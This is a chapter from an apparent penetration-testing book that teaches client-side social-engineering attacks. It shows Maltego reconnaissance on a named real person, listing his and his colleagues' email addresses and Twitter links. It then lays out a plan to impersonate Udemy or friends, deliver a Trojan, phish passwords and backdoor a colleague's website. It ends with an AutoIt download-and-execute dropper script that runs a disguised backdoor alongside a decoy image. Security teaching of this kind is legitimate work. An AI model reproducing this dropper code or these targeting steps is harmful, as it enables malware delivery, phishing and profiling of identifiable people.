<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">Client-Side Attacks - Social Engineering</h1>
                </header>
            
            <article>
                
<p class="CDPAlignLeft CDPAlign">This chapter focuses on client-side attacks, where the victim's action will allow us to gain access to their system, which is where the social engineering concept is going to be useful to help us to launch an attack. We are going to look at a tool called Maltego, which is a very powerful tool for gathering information, but we will just look at it's basic applications in this chapter. Then, we are going to search all the possible social links that are related to our target; we will be using the Maltego tool for this, too. Following that, we are going to target the victim via their Twitter and email contacts. As we move ahead, we will be using the backdoor file. Then, we will generate an icon for the file <span>–</span> it looks more like an ordinary image, but it is a backdoor in disguise so that we can get access to the system. We will also learn how to change the extensions of the files that can be sent to the target. Finally, we will perform email spoofing, which means we will send emails to the victim via a valid email ID.</p>
<p>This chapter covers the following topics:</p>
<ul>
<li>Client-side attacks using social engineering </li>
<li>Maltego overview</li>
<li>Social engineering – linking accounts</li>
<li>Social engineering – <span>Twitter</span></li>
<li>Social engineering – emails</li>
<li>Social engineering – summary</li>
<li>Downloading and executing AutoIt </li>
<li>Changing the icon and compiling the payload</li>
<li>Changing extensions</li>
<li>Client-side attacks – TDM email spoofing</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Client-side attacks using social engineering </h1>
                </header>
            
            <article>
                
<p>So far, we've seen really good methods in client-side attacks. These methods were good because we didn't really need to ask the client to do anything. We would gain access to the target computer if the client updated their system, or, if they downloaded something, then we'd backdoor it on the fly. These methods are really good because we don't actually need to do something, so the target has to do an action, but we don't need to ask them to do something. The only problem with these methods is that we need to be the man in the middle, we either need to do the ARP poisoning, we need to start our own fake access point, or we need to do something to become the man in the middle.</p>
<p>In the next sections, we're going to talk about a method we can use if we aren't the man in the middle, if the person exists in a remote place where it's not possible for us to become the man in the middle. Here, we're going to be talking about social engineering. Social engineering is a vast concept; there are so many attacks that we can do because it all depends on the target. Sometimes, we don't even need any technical information to do these kinds of attacks, so it all depends on our target and how we are going to build a strategy to attack that target. We are going to be gathering information in order to get access to victims' systems. We need to gather as much information as we can about our target, about what websites they use, who their friends are, and so on; anything, any piece of information, can become really useful to us in social engineering.</p>
<p>We will first be looking at how to gather information about a specific person. So, all we have is just a name, or a Facebook account, and any information we can gather based on that name. After that, we're going to start building a strategy, and we'll see how we can use all the information that we gathered to build a strategy in order to build an attack and gain access to the target computer system, and, at the end, we're going to create our backdoor. We're going to make a backdoor that's acceptable to the target user, so they'll probably use it, and we'll also see how we can pretend to be one of their friends and get the target person to run the backdoor. We are actually going to be asking them to run a specific file, instead of the methods that we've seen so far where the user voluntarily updates their system or downloads a certain executable.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Maltego overview</h1>
                </header>
            
            <article>
                
<p>In this section, we'll look at a tool that we're going to be using often in this chapter. This tool is great for information gathering and it allows us to gather information about almost anything, we can gather information about people, websites, computers, companies, phone numbers, everything really; everything we can think of, we can add to this tool and try to extract information related to that entity. The tool is called Maltego, and it's going to become our best friend when it comes to information gathering. This tool can be used to gather information about anything, but using the tool is the same, so it doesn't matter whether our target is a website, a person, a phone number, or a company. Only the information that we will be getting is going to be different. In this section, we're going to have a quick overview of this tool, and then we're going to be using it more in the following sections.</p>
<p>In order to run the tool, just go to <span class="packt_screen">Show</span> <span class="packt_screen">Applications</span>, then type <kbd>maltego</kbd> in the search bar, and we can see that a tool called <span class="packt_screen">maltego</span> appears:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/be4f8ac1-f6da-44eb-aef3-bbf0ceef228a.png" style="width:26.67em;height:15.25em;"/></div>
<p>The first time the tool is used, we will be asked to log in with a username and a password; if we don't have one, we will have to register through the wizard. We just have to create a new username and new password, they'll send us an activation link, and then we'll be able to log in and use the tool. Once we log in, it will offer us one of the already made templates for gathering information. We are not going to use any of those. In the following screenshot, we can see the home page, and from here we can add more transformers to the tool:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/3bfc243f-82fd-4513-b61c-19486c87dbd2.png"/></div>
<p>Basically, transformers are plugins that allow us to gather information about specific things. We can just click on <span class="packt_screen">Install</span> on any of available options that we can see in the screenshot and it will add more transformers or more things that we <span>can do with Maltego. A lot of these extra transformers will ask us to log in with a username and a password or use a certain API.</span></p>
<p>For now, we're just going to use the built-in transformers, and we are going to go to the entity selection menu on the menu bar to create a new graph and open a principle workplace for Maltego:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-770 image-border" src="assets/68e4913d-ccab-4555-b4c0-5ce039629320.png" style="width:30.42em;height:4.33em;"/></div>
<p>As we can see in the following screenshot, in the middle we have our graph, where we are going to be seeing our entities and information about entities:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/0e47a3e7-5bfb-4e79-b9e7-c0833bd7c62f.png"/></div>
<p>In the <span class="packt_screen">Overview</span> tab, we have an overview of the graph, in <span class="packt_screen">Detailed View</span>, we have details about each entity in the graph, and in the <span class="packt_screen">Property View</span> tab in the bottom right corner, we will be able to change the properties for each of these entities. All these tabs are empty now, but once we start using the tool, it'll start making sense straightaway. In the top left corner, we have our entities in the <span class="packt_screen">Entity Palette</span> tab, where they are organized into categories depending on the type of entity.</p>
<p class="mce-root"/>
<p>For example, if we click on <span class="packt_screen">Infrastructure</span>, it will allow us to add a domain name; we can add MX records, URLs, or a website:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/f8db635b-f0ac-4dee-b4a6-4c7a9beb0387.png" style="width:17.83em;height:37.08em;"/></div>
<p>We can just drag and drop the entity that we want; for example, if we want a website, just drag and drop the <span class="packt_screen">Website</span> entity in the graph editor window and now we have a website in the graph. From here, we can start gathering information about the website:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/975fa72e-0d5a-46d4-be77-1edd160925ff.png"/></div>
<p class="mce-root"/>
<p>There are a lot of different types of entities. We can also add a device from <span class="packt_screen">Entity Palette</span>. For example, if we go to <span class="packt_screen">Personal</span>, we can actually just add a <span class="packt_screen">Person</span> entity, give their first and last names, and then we will be able to gather information about this person. We can also add a phone number and start gathering information about it:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/28a9bbf5-6271-45c3-afc4-1bddf34db423.png"/></div>
<p>One of the really amazing categories here is <span class="packt_screen">socialLinks</span>, which will allow us to add <span class="packt_screen">Facebook</span> entities, while also allowing us to add <span class="packt_screen">GitHub</span>, <span class="packt_screen">Foursquare</span>, <span class="packt_screen">LinkedIn</span>, <span class="packt_screen">Instagram</span>, and other social networks:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/e29c6eee-5a02-42f7-a9f6-269d2ed55d81.png"/></div>
<p>Once we add them, we will be able to gather information about these entities, and obviously this information will really help us when it comes to trying to exploit that person and hack into their system.</p>
<p class="mce-root"/>
<p class="mce-root"/>
<p class="mce-root"/>
<p>Once we add the entity, as we can see in the following screenshot, if we click on the website, for example, we are just going to go to the <span class="packt_screen">Property View</span> tab and we can see that we can modify the properties for the selected website. Suppose, for example, the first thing that we need to change is to put the name of our target website in the <span class="packt_screen">Website</span> parameter:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-780 image-border" src="assets/127db7b5-6c36-4f3d-8b4c-0f7be0eb9600.png" style="width:28.33em;height:8.17em;"/></div>
<p>Once we do that, we can right-click the website entity on the graph and select what type of information we want to gather. In the following screenshot, we can see all the possible options:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-781 image-border" src="assets/52856373-b42c-44b6-9ddb-35ba9999cbf3.png" style="width:21.50em;height:15.50em;"/></div>
<p><span>We are not going to run any transformers in this section; we're going to do this in the next sections. For now, we are just showing us a quick overview of the tool, how to add entities, how to run transformers, and what we mean by all of these things. A lot of this is still a bit vague, but we're going to be using this tool a lot in this chapter, and it's going to become very easy for us. As we know, we can use it to gather information about anything, and it's really going to enhance our social engineering skills.</span></p>
<p class="mce-root"/>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Social engineering – linking accounts</h1>
                </header>
            
            <article>
                
<p>In this section, we will learn how to target a person. We are going to start with just a person's name, and then see how we can gather information about that person and build up an attack strategy. As we do that, we're also going to look at more of Maltego's features and how to configure a few more settings. So, we are going to start a new graph by clicking on the plus sign, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-782 image-border" src="assets/9a419fb8-b9b8-4087-8c62-e528dee3a4ef.png" style="width:30.42em;height:4.33em;"/></div>
<p>Inside the <span class="packt_screen">Entity Palette</span>, search for a <span class="packt_screen">Person</span> entity under the <span class="packt_screen">Personal</span> section, and then drag and drop the <span class="packt_screen">Person</span> entity to the workspace. We are going to assume that we have a target and we know their name, so the first name is <kbd>Zaid</kbd> and the surname is <kbd>Sabih</kbd>. We're going to go to the <span class="packt_screen">Property View</span> tab and set the <span class="packt_screen">First Names</span> property; just double-click it. We are going to set it to <kbd>Zaid</kbd>, and then we are going to set the <span class="packt_screen">Surname</span> property to <kbd>Sabih</kbd>, as shown in the following screenshot:</p>
<p class="mce-root CDPAlignCenter CDPAlign"><img src="assets/b7eaf300-449b-4d68-b3d1-3bd8dbb5167b.png" style="width:25.75em;height:21.17em;"/></p>
<p>Now, let's see what information can we gather about the entity created. Again, all we have to do is right-click the entity and see what we can get. So, we click on the <span class="packt_screen">PATERVA CTAS</span> category, and we are going to go to <span class="packt_screen">All Transforms</span>; we can get associated emails, we can try to get a phone number, and we can try to get a Twitter account; we can try all of these. For now, we are going to try to get a website, or websites, for this person:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/f71f14f1-a84f-4983-97a7-9442299ea183.png" style="width:20.33em;height:19.92em;"/></div>
<p>Now, it will ask us whether we want to look for a specific domain name. We are going to assume that we know nothing, so we are just going to put a space between two websites, in both entries. That just means looking for any websites that are associated with this person:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/3d980eb2-45a8-4d95-8fb8-a428c3833501.png" style="width:34.33em;height:19.50em;"/></div>
<p class="mce-root"/>
<p class="mce-root"/>
<p>After clicking <span class="packt_screen">Run!</span>, we should get a number of websites, and all of the websites are associated with Zaid Sabih:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1798 image-border" src="assets/2b51c427-b61f-45f4-b8a6-4425b7cf8f83.png" style="width:45.67em;height:35.25em;"/></p>
<div class="mce-root CDPAlignCenter CDPAlign packt_figref">Association websites </div>
<p class="mce-root"/>
<p>Now, that doesn't really mean that these websites are actually associated with our target, because there could be another person named <span class="packt_screen">Zaid Sabih</span>, so we will have to go to each one and see which are actually related to that person. For example, we will double-click on the Facebook website to see the associated information. In <span class="packt_screen">Properties</span>, we will see that we have the Facebook URLs that are associated with that particular name:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1799 image-border" src="assets/32365003-7d76-4b6b-a6f6-f70200dcfbca.png" style="width:44.75em;height:11.50em;"/></div>
<div class="mce-root CDPAlignCenter CDPAlign packt_figref">URLs associated with the target</div>
<p>We can even copy the URL to a text file to read it better, and we can see in the following screenshot that we have three profiles:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1800 image-border" src="assets/07210101-ec0a-4272-b0bf-6b9f62fedfb3.png" style="width:41.67em;height:5.33em;"/></p>
<p>Now, in a real-life situation, we should go into each of these profiles and see which one is actually related to our person. In this example, we are not going to do that because three of them are actually not related to Zaid at all, so this is really not useful. In this case, we will just come back, move to the next entity, and see what's useful. </p>
<div class="packt_infobox">It is highly recommended to delete the ones that are not useful because they'll just make it harder to look through things. Just click it, press <span class="packt_screen">Delete</span>, and that will delete it for us.</div>
<p class="mce-root"/>
<p class="mce-root"/>
<p class="mce-root"/>
<p class="mce-root"/>
<p class="mce-root"/>
<p class="mce-root"/>
<p class="mce-root"/>
<p class="mce-root"/>
<p>For our example, it's all related to our target. We can double-click each one of them, go to <span class="packt_screen">Properties</span>, look for the URL, and open it in our browser. When we do that, we will get the information related to that person, and it will help us to form some sort of an attack strategy, or help us to get even more information. For now, because we have already looked at all of them, we are going to focus on one of them, which is the Udemy link, that is, the information related to our target on Udemy. We are going to double-click as we did before, go to <span class="packt_screen">Properties</span>, get a URL, copy that URL, and open it in our browser. We can see that the URL is related to our target person, and we can see that it's leading us to a course taught by our target. Although this information is not really useful, we can now see that the target person is teaching online courses:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1801 image-border" src="assets/686efa76-2663-4162-8a31-8d95b30982aa.png" style="width:106.58em;height:33.50em;"/></p>
<p>Go back and look at the other two URLs. If we browse the second URL, we can see it is showing us the profile for the target person:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/8ab47f12-f386-488f-bd9b-efd68cd9a0cf.png"/></p>
<p class="mce-root"/>
<p>By browsing the URL, we can gather information about the person. We can check all the websites to gather more information about them. Now, we need to keep in mind that we are setting our target—which is me, a person with knowledge of computers and information technology. When we are targeting normal companies or normal people, it will be easier to get effective information. If we look at their YouTube, LinkedIn, and Facebook profiles, we really won't get much. Even if we click on their Facebook profile, we will see that Facebook won't lead us to anything, we need to log in, and even after logging in, we won't get too much useful information. What's useful is if we go to their blog and go to the <span class="packt_screen">ABOUT</span> section; what's useful here is that we have the email address of the target person, and we have their Twitter account:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/9f3e8ee3-7509-40f3-bcf8-eb2d8666c352.png" style="width:43.33em;height:21.25em;"/></p>
<p>This information was not included on Udemy, and now we have two really useful pieces of information. In the next section, we'll see how we can use this information to gather even more info about our target, and hopefully be able to build up an attack strategy.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Social engineering – Twitter</h1>
                </header>
            
            <article>
                
<p>So now we have the email address of our target person and their Twitter account. Let's start with Twitter and see what we can get from that. Open the Twitter account for the target person, copy the link, and we're going to come to our workspace, Maltego to add a Twitter entity. We're going to add a Twitter entity from the <span class="packt_screen">Social Network</span> category. Maltego has an entity for Twitter, it's just not being shown so, let's see how to access these settings.</p>
<p>Go to <span class="packt_screen">Entities </span>| <span class="packt_screen">Manage Entities</span>, and we can see a list of entities that we can add:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/56963fa7-879e-44b1-b1d3-95bb8ca5dbba.png" style="width:31.83em;height:36.92em;"/></p>
<div class="mce-root CDPAlignCenter CDPAlign packt_figref">Entity list</div>
<p>All of these entities are not added to the <span class="packt_screen">Entity Palette</span>; the one we are interested in right now is <span class="packt_screen">Affiliation – Twitter</span>, the membership of the Twitter social network.</p>
<p>Now, click on the three little dots that appear on the right, it will open a window, as seen in the following screenshot. We are going to go to <span class="packt_screen">Advanced Settings,</span><span> check the box that says <span class="packt_screen">Palette item,</span> click on <span class="packt_screen">OK,</span> and close the window:</span></p>
<p class="CDPAlignCenter CDPAlign packt_figref"><img src="assets/3bc03c7f-e473-402f-8914-fdf2435ec5c7.png" style="width:44.58em;height:32.08em;"/><br/>
Edit Entity </p>
<p><span>Now, the Twitter entity should be showing up in the <span class="packt_screen">Entity Palette</span>. So again, we are going to use this as a normal entity. Just drag and drop it, we are going to set the name of it in the <span class="packt_screen">Properties</span> section, which is going to be <kbd>Zaid</kbd>, we're going to put the URL in the <span class="packt_screen">Profile URL</span> tab, and our user ID is <kbd>Zaid_alq</kbd>:</span></p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/f8810e64-a22d-4958-8bbc-01f7d8b3b720.png" style="width:21.83em;height:17.50em;"/></p>
<div class="CDPAlignCenter CDPAlign packt_figref">Entity Palette</div>
<p><span>Now, we can gather information about the target person based on their Twitter account. Right-click the entity and let's see what we can get:</span></p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1854 image-border" src="assets/46677b86-fde0-4e54-8deb-dae55fa153ee.png" style="width:28.17em;height:17.75em;"/></p>
<p class="mce-root CDPAlignCenter CDPAlign">Information about the target</p>
<p><span>So we can get their tweets, we can see the tweets that they sent to people, we can transfer this, we can get more details, and we can get their followers. </span></p>
<p class="mce-root"/>
<p>What we really want to get is their friends so that we can actually target them through their friends. So again, click on the <span class="packt_screen">Run</span> button in front of the <span class="packt_screen">To Twitter friends</span> option. This particular transformer requires us to log into Twitter. As we can see in the following screenshot, Maltego is telling that us we have to log into Twitter to be able to gather information about the target person:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/4bdeb697-2222-4347-a8d0-ad670f26a8fc.png" style="width:32.42em;height:19.50em;"/></p>
<div class="CDPAlignCenter CDPAlign packt_figref">Information log</div>
<p>In the preceding screenshot, click on <span class="packt_screen">Sign In</span>, and log in with a username and a password. Now it's asking us whether we want to authorize this app. We are going to click on <span class="packt_screen">Authorize app</span>:</p>
<div class="CDPAlignCenter CDPAlign packt_figref"><img src="assets/b85d60af-f999-4e01-ba20-827670905be6.png" style="width:26.25em;height:17.75em;"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref"><span>Authorize App</span></div>
<p>Now, we should be logged into Maltego, go back to Maltego, and when we come back to the tool, close the sign-in window and it should start to look for friends on the target Twitter account. As we can see, we managed to get the people who are friends with Zaid, and we can see some really interesting information:</p>
<p class="CDPAlignCenter CDPAlign packt_figref"><img src="assets/968afd46-ef21-448f-8bbc-9269f118d660.png" style="width:33.67em;height:34.00em;"/></p>
<div class="CDPAlignCenter CDPAlign packt_figref">Victims connections on Twitter</div>
<p>Websites are not very useful. We can pretend to be a person from one of these websites and there is a high chance that Zaid will respond to it, but it's not as good as using their contacts. So delete these websites, and now we can see that Zaid has three friends, and we can use all of them. Right-click on them to ascertain more information about them:</p>
<p class="CDPAlignCenter CDPAlign packt_figref"><img src="assets/5d4cab0a-d301-43d4-80e0-b2efd86dbee3.png" style="width:25.83em;height:28.83em;"/></p>
<div class="CDPAlignCenter CDPAlign packt_figref">Detail information about the connections</div>
<p>In the next section, we'll go back to where we were. So, we have gathered information about the Twitter account and now we'll see how to gather information about the email of the same Twitter person.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Social engineering – emails</h1>
                </header>
            
            <article>
                
<p>OK, now let's see what can we get using the email of the target person, which is <kbd>zaid@isecur1ty.org</kbd>. In Maltego (and we are going to add a new entity of an email address), go to <span class="packt_screen">Personal</span> | <span class="packt_screen">Email Address</span>, drag and drop it into the graph, and set <span class="packt_screen">Email Address</span> to <kbd>zaid@isecur1ty.org</kbd> from <span class="packt_screen">Properties</span>, as can be seen in the following screenshot:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/ec85c571-b59e-4735-9b24-481327b6bfad.png" style="width:22.83em;height:11.17em;"/></p>
<div class="CDPAlignCenter CDPAlign packt_figref">Properties </div>
<p><span>We managed to get an email address from the target's blog. Using the email, we're now going to see what information we can get.</span></p>
<p>Right-click the entity as usual and we will see a list of <span class="packt_screen">Run Transform(s)</span><span>. For our example, click on <span class="packt_screen">To Domain [DNS] </span></span>and click the <span class="packt_screen">Run</span> button:</p>
<div class="CDPAlignCenter CDPAlign packt_figref"><img class="aligncenter size-full wp-image-1859 image-border" src="assets/5812371c-d837-48e8-bad4-8fdf538469b7.png" style="width:22.42em;height:16.00em;"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref">Run Transforms list</div>
<p class="mce-root"/>
<p>We can see that we got a domain name, which is <kbd>isecur1ty.org</kbd>. From the following website, we are going to try to get the email addresses associated with the website:</p>
<div class="CDPAlignCenter CDPAlign packt_figref"><img src="assets/3460298b-a760-45f8-92ea-32194a655aeb.png" style="width:8.92em;height:27.17em;"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref">Domain name</div>
<p>Right-click on the website, click on <span class="packt_screen">Email addresses from domain</span>, and click on the <span class="packt_screen">Run All</span> button to run all the transformers that will get the email addresses associated with the domain:</p>
<div class="CDPAlignCenter CDPAlign packt_figref"><img src="assets/98d1ea83-5ec8-420a-969c-ade3a3e247d7.png" style="width:20.00em;height:11.08em;"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref">Run Transforms</div>
<p>We have <kbd>m.askar@isecur1ty.org</kbd>, which is the same person we found on the target's Twitter account:</p>
<div class="CDPAlignCenter CDPAlign packt_figref"><img class="aligncenter size-full wp-image-1863 image-border" src="assets/d58cd76f-04be-4ec3-b4cb-7b00d083cb1d.png" style="width:20.75em;height:20.08em;"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref">Connections on twitter</div>
<p>Another thing that we can do from the domain is transfer to a website, right-click on the website, and click on <span class="packt_screen">To Website [Quick lookup]</span>:</p>
<div class="CDPAlignCenter CDPAlign packt_figref"><img class="aligncenter size-full wp-image-1864 image-border" src="assets/46892c9b-9719-4746-8d62-48a318e40278.png" style="width:22.75em;height:22.00em;"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref">Transfer to website option</div>
<p>The following is the website:</p>
<div class="CDPAlignCenter CDPAlign packt_figref"><img class="aligncenter size-full wp-image-1865 image-border" src="assets/6f1424fd-cc6f-4948-acd0-ade2a9892048.png" style="width:15.92em;height:21.83em;"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref">Websites associated with the target</div>
<p>From the website, we're going to look for email addresses associated with it, right-click on the website, click on <span class="packt_screen">Mirror: Email addresses found,</span> and then click <span class="packt_screen">Run</span>:</p>
<p class="CDPAlignCenter CDPAlign packt_figref"><img class="aligncenter size-full wp-image-1866 image-border" src="assets/62ac7c1c-2639-4570-83ba-afc6df663362.png" style="width:22.33em;height:21.67em;"/></p>
<div class="CDPAlignCenter CDPAlign packt_figref"><span>Extracting Email-ids of connections</span></div>
<p class="mce-root"/>
<p>Once complete, we get two useless emails, so we are going to delete these two, leaving us with two good ones:</p>
<p class="CDPAlignCenter CDPAlign packt_figref"><img class="aligncenter size-full wp-image-1867 image-border" src="assets/962cd565-f62f-49ea-b7cd-678a520dc5b9.png" style="width:22.58em;height:17.33em;"/></p>
<div class="CDPAlignCenter CDPAlign packt_figref"><span>Email-ids of connections</span></div>
<p>So we have <kbd>mustafa@albazy.com</kbd>, which is the same person that we found on Twitter, and we have <kbd>info@isecur1ty.org</kbd>. Now again, we can just keep gathering more information about our target. We have enough information to start building up an attack strategy on the target person. In the next section, we'll discuss all the info that we gathered and we'll come up with ideas on how we can attack this person and hack into their system or into their accounts.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Social engineering – summary</h1>
                </header>
            
            <article>
                
<p>In this section, let's see how we can build up an attack strategy against our target, which is a person named Zaid. Before we move ahead, we will organize the workspace so that we can come up with ideas. For our example, we are going to keep only the useful information such as Udemy. We are going to put Zaid, who is our main entity, at the top, and then just click and drag an arrow from the email address so that we know that Zaid is associated with the <span><kbd>zaid@isecur1ty.org</kbd> </span>address. Zaid is associated with the <kbd>zaid@isecur1ty.org</kbd> email, which led us to <kbd>isecur1ty.org</kbd>. And then we're going to add another arrow from Zaid to his Twitter account, so that we know that this Twitter account is associated with this person, and we have an entity here of Udemy. We also know that Mohammed Askar's email is <kbd>m.askar@isecur1ty.org</kbd>, and this email is associated with Mohammed.</p>
<p class="mce-root"/>
<p>Also, if the email is <kbd>@isecur1ty.org</kbd>, then this person is probably is associated with <kbd>isecur1ty.org</kbd> as well. If we do a Google search, we will see that Askar is the admin of <kbd>isecur1ty.org</kbd>. So again, we're going to include an arrow from isecur1ty to Mohammad. We are going to do the same with the Mustafa entity because we can see we have his email, <kbd>mustafa@albazy.com</kbd>, and we'll also associate isecur1ty with this person. So now, as can be seen in the following screenshot, our target is Zaid, and we know Zaid uses Udemy and teaches courses there. We were also able to find Zaid's blog, and we were able to see his YouTube and LinkedIn profiles:</p>
<div class="CDPAlignCenter CDPAlign packt_figref"><img src="assets/842ca458-19a4-4a54-bfc4-f6dd8bc54c4b.png"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref">Connections associated to the target.</div>
<p class="mce-root"/>
<p>This arrangement can make us think of so many ways to attack Zaid; we can look at how active he is on Udemy and pretend to be a person from Udemy. We can pretend to be an admin from Udemy and send him a program, for example, and tell him this is our new beta program that we're only giving to special instructors. This way, Zaid will feel privileged because he's getting something that other instructors are not getting, and he'll run that file. And once he runs that file, which is a Trojan, it will create a backdoor, a keylogger, or a program that will steal his passwords, or allow us to do anything we want on the target computer. As mentioned earlier, we're not going to be studying technical things in this section; we'll look at that in upcoming sections, so we'll know how to do it. When we say we'll send him a file that looks like a normal file, we'll actually be able to do that, and this normal file will be a normal program, but, in the background, it will do what we tell it to. We can also pretend to be from YouTube, from WordPress, or from Udemy, and ask Zaid to reset his password and give him a link that has a login page exactly the same as the login page of Udemy or YouTube. Once he puts in their password, we'll actually get that password. So the possibilities are endless here, and we'll talk about ways of doing all of that later on.</p>
<p>Looking at the connections that we can see with isecur1ty, we can see that this person has a lot of connections with the isecur1ty company. We can see that he has an <kbd>@isecur1ty.org</kbd> email. Again, this email is really useful because this is how we're going to be communicating with Zaid. We can also communicate with him through Udemy by sending him messages, but it is obvious that his friends don't really communicate with him over Udemy. So we should target Zaid using his email. And we have his friends, such as Mohammed, and we can see that there are many connections between him and Zaid. They're both friends on Twitter, they're both active on isecur1ty, and they both have <kbd>@isecur1ty.org</kbd> emails. So this makes us think they're not only work colleagues, but that they're probably friends as well. By exploiting this friendship, we can send stuff to Zaid asking him about anything really; we can show him pictures of a car that we want to buy, or we can send him PDFs, because we know that both of these guys are interested in computer security <span>–</span> they're running a security website. If we send him a PDF, when he opens the PDF, it'll run the file that we want it to run on the system, which will give us access to Zaid's system.</p>
<p>When we send an email, we will be able to send an email that looks exactly as if it's coming from Mohammed, and we can do the same with Mustafa. So we can send stuff to Zaid, we can send him things that they're both interested in, we can send him pictures, or links asking him to log in and do something; the possibilities are endless when it comes to social engineering. Not only that, let's say we tried everything and we couldn't hack into Zaid's system. We pretended to be all of these people and tried everything that we could think of, and we still couldn't reach Zaid's system. This is not the end of the world; instead, we could try to hack into one of his friend's computers. So we can try to hack into Mohammed's computer or Mustafa's computer. From there, we'd try to get into their Facebook and then communicate with Zaid via Facebook, because we can't really send a message that looks like it's coming from Mohammed on Facebook, we can only do that with emails, but again, we can hack into these guys' Facebook accounts and then try to hack into Zaid's. Why not hack into their isecur1ty accounts? We know these people are admins; they have <kbd>@isecur1ty.org</kbd> emails. We could hack into their computers and hack into <kbd>isecur1ty.org</kbd>. Zaid definitely browses isecur1ty, so embed a backdoor in there or change one of the files that's hosted on isecur1ty into a backdoor, and then once Zaid downloads it or uses it, we will be able to hack into his computer.</p>
<p>In the next section, we will learn how to send these fake emails, create these backdoors, create these keyloggers, and all that cool stuff. For now, I just wanted to show how powerful Maltego is and how we can use it to gather information about anything. We started with nothing but a name, Zaid Sabih, and we were able to gather information about his websites, his blog, his YouTube, friends, and emails. Again, this person is a techie, a person who is interested in information technology, so he's very careful about what he shares, but we were still able to gather enough information to build up an attack strategy. If we do this with a normal person, we will be surprised by the amount of information we can gather about them.</p>
<p class="mce-root"/>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Downloading and executing AutoIt </h1>
                </header>
            
            <article>
                
<p>In this section, we will learn how to combine the backdoor that we created with any other file type, so that when executed, it will display an image, a PDF, a song, or something that the target person is interested in. This way, we will be able to social engineer them to run our backdoor and they will see something that they trust, but our backdoor will be running in the background. We're going to do this using a download and execute script that will basically download the backdoor, download the file that the person expects, run the files that the person expects, and run the backdoor in the background. The download and execute script is included in the resources, which is available at the book's GitHub repository. After downloading the file, open the file and we can see the code used inside the script:</p>
<pre>#include &lt;StaticConstants.au3&gt;<br/>#include &lt;WindowsConstants.au3&gt;<br/><br/>Local $urls = "url1,url2"<br/><br/>Local $urlsArray = StringSplit($urls, ",", 2 )<br/><br/>For $url In $urlsArray<br/>  $sFile = _DownloadFile($url)<br/>  shellExecute($sFile)<br/><br/>Next<br/><br/>Func _DownloadFile($sURL)<br/>    Local $hDownload, $sFile<br/>    $sFile = StringRegExpReplace($sURL, "^.*/", "")<br/>    $sDirectory = @TempDir &amp; $sFile<br/>    $hDownload = InetGet($sURL, $sDirectory, 17, 1)<br/>    InetClose($hDownload)<br/>    Return $sDirectory<br/>EndFunc ;==&gt;_GetURLImage</pre>
<p>The script is programmed so that we can use it to download and execute anything, and any number of files. So, all we have to do is enter the links or the URLs for the files in the <kbd>Local $urls</kbd> parameter, and separate the links by a comma. So we can enter URL, and keep going. We can use this script to download and execute two executables, three executables, or any number of files we want. Now, we are going to put in the file that we want the target person to see. This file needs to be available online and uploaded on a direct link so that it can be downloaded from that link. For this example, we are going to use an image, but we can use any other file types, even get them to open a PDF, or anything else that we want.</p>
<p class="mce-root"/>
<p>Therefore browse Google Images and look for an image. Click and open the image, right-click on the image, and click on <span class="packt_screen">Copy image address</span>:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/9e134fce-89db-4165-905d-0032b0604e21.png" style="width:33.08em;height:33.08em;"/></p>
<p>Notice that when we do this, we get the image itself through a direct URL on the address bar, so we can see that the end of the URL is <kbd>.jpg</kbd>. When we access the image, there will be no ads around it; all we can see is the file itself. The files included in our script all need to have a direct URL. Paste the URL into the script as follows:</p>
<pre class="CDPAlignLeft CDPAlign">Local $urls = "https://res.cloudinary.com/goodsearch/image/upload/v1508929095/hi_resolution_merchant_logos/packt-publishing_coupons.png"</pre>
<p class="mce-root"/>
